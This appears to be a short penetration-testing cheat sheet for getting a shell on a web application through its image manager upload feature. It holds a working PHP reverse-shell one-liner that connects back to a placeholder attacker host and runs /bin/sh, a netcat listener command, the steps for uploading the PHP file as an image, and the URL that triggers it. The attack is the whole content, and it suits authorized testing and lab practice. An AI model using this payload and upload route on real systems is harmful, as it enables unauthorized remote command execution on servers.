### Edit a reverse shell
```
<?php $sock=fsockopen("<lhost>",<lport>); exec("/bin/sh -i <&3 >&3 2>&3"); ?>
```

### Start listener
```
nc -lvp <port>
```

### Upload php webshell
```
Tools > Image Manager > Choose File > Upload
```

### Use following path to trigger the shell
```
http://<rhost>/<path>/myFiles/images/<phpShell>  
```

